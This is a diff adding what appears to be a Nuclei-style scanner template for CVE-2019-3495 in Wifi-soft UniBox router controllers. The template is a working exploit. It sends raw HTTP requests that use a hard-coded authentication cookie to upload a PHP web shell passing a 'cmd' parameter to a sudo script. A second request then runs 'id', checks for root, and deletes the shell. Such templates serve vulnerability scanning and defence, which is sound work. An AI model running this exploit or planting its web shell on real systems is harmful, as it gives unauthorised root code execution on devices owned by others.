@@ -1,0 +1,61 @@
+id: unibox-router-rce
+info:
+  name: UniBox Router RCE (CVE-2019-3495)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    An issue was discovered on Wifi-soft UniBox controller 0.x through 2.x devices. The `network/mesh/edit-nds.php` endpoint is vulnerable to arbitrary file upload, allowing an attacker to upload .php files and execute code on the server with root privileges. Authentication can be bypassed using hard-coded credentials.
+  classification:
+    cve-id: CVE-2019-3495
+    cvss-metrics: '3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
+    cvss-score: 9.8
+  tags: file-upload, rce, auth-bypass
+  reference:
+    - https://sahildhar.github.io/blogpost/Unibox-Controller-Multiple-Remote-Command-Injection-Vulnerabilties/
+
+variables:
+  boundary: "cfc5ef72aab9d5ead781940d6e055ff5"
+  phpname: "{{rand_base(16)}}"
+
+http:
+  - raw: |
+      POST /network/mesh/edit-nds.php HTTP/1.1
+      Host: {{Hostname}}
+      Cookie: user=unibox; pass=294a3d333d2f6b7e121594189fce9a72
+      Content-Type: multipart/form-data; boundary={{boundary}}
+
+      --{{boundary}}
+      Content-Disposition: form-data; name="file"; filename="{{phpname}}.php"
+
+      <?php echo shell_exec("sudo /usr/local/unibox-0.9/scripts/exeCommand.sh '".$_REQUEST['cmd']."'"); ?>
+      --{{boundary}}
+      Content-Disposition: form-data; name="sent"
+
+      Save Page or Upload File
+      --{{boundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "/network/mesh/data/uploads/unibox/"
+        part: body
+
+    extractors:
+      - type: regex
+        name: uploaded_path
+        regex:
+          - "/network/mesh/data/uploads/unibox/[a-f0-9]{16}\\.php"
+        group: 0
+        internal: true
+
+  - raw: |
+      GET /network/mesh/data/uploads/unibox/{{phpname}}.php?cmd=id;rm+-rf+./{{phpname}}.php HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "uid=0(root)"
+        part: body
